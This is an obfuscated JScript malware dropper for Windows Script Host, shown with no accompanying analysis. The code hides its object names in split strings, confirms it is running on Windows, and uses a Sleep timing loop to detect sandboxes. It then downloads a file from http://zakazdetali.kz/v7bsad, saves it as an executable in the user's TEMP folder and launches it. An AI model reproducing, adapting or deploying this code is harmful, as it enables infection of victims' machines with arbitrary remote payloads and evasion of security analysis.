var _KO = false;
var _TY = "CreateObject";
var _QG = function _C() {return WScript[_TY]("WScript"+".Shell");}(), _BU = 11;
var _D0 = "MSXML2.XMLHTTP";
var _EO = 2123213;
var _Q = 0;
function _C0(_S1){_QG["Run"](_S1, _Q, _Q);};
function _YY(){return _D0 + "";};
function _I(_I1, _E0){_Q = _Q * 1; return _I1 - _E0;};
function _VK(){return _TY;};
/*@cc_on
  @if (@_win32 || @_win64)
    _KO = true;
  @end
@*/
if (_KO)
{
var _WT = "";
function _CA(){return 22;};
var _O = 0; var _D1 = 0;
function _U()
{
var _DR = new this["Date"]();
var _YN = _DR["getUTCMilliseconds"]();
WScript["Sleep"](_CA());
var _DR = new this["Date"]();
var _T = _DR["getUTCMilliseconds"]();
WScript["Sleep"](_CA());
var _DR = new this["Date"]();
var _Y = _DR["getUTCMilliseconds"]();
var _O = "_S";
_O = _I(_T, _YN);
var _D1 = "_D";
_D1 = _I(_Y, _T);
_WT = "open";
return _I(_O, _D1);
}
var _Z = false;
var _SK = false;
for (var _HS = _Q; _HS < _CA() * 1; _HS++){if (_U() != _Q){
_Z = true; 
_D1 = "31" + 11 * _O + _D1; 
_SK = true; 
break;
}}
function _FF() {return ((_Z == true) && (_Z == _SK)) ? 1 : _Q;};
if (_Z && _FF() && _SK){
function _XR() {return _QG["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "NQPgJGzpwou.ex" + "e";};
 _WN = _YY();
 _E = WScript[_TY](_WN);
 var _I0 = 1;
 while (_I0){
try {
	if (_I0 == 1)
	{
		_E[_WT]("GET", "http://zakazdetali.kz/v7bsad", false);
		_E["send"]();
		_S0 = "Sleep";
	}
	WScript[_S0](_CA() + 120); 
	if (_E["readystate"] < 2 * 2) continue;
	_I0 = _Q;
	function _SD(_CK) {var _SO = (1, 2, 3, 4, 5, _CK); return _SO;};
	_FZ = WScript[_VK()]("ADODB.Stream");
	_WN = _FZ;
	_WN[_WT]();
	_WN["type"] = _SD(1);
	_WN["write"](_E["ResponseBody"]);
	_FZ["position"] = _SD(_Q);
	_WN["Save" + "ToFile"](_XR(), 2);
	_FZ["cl"+"ose"]();
	_F = _XR();
	_C0(_F);
} catch(_EI){};
}
}
}

